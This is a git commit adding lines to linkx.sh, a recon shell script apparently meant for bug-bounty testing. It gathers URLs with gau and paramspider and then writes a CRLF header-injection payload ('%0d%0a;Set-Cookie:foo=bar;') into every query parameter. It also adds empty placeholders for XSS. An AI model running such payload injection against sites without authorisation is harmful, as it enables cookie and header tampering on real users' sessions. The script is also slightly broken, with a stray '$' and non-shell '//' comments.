15803fa85ca0721d2d7ba6242a56985489ce093f
notrickyyy <68660232+notrickyyy@users.noreply.github.com>
2020-11-15 00:43:04 +0545

    Update linkx.sh

--- linkx.sh
+++ linkx.sh
@@ -2,4 +2,9 @@ gau $1 | grep "=" | tee $1.txt
 python3 paramspider.py -d $ >> $1.txt
 cat $1.txt | qsreplace "filter" | sort -u | tee $1_raw.txt
 cat $1_raw.txt | grep -v -e ".svg" -e".woff" -e ".js" -e ".css" -e ".ttf" -e ".eot" | sort -u > $1_resolved.txt
+cat $1_resolved.txt | qsreplace "cokieinj%0d%0a;Set-Cookie:foo=bar;" > $1_CI.txt
+//for ManualXSS
+
+//for blindXSS
+
 
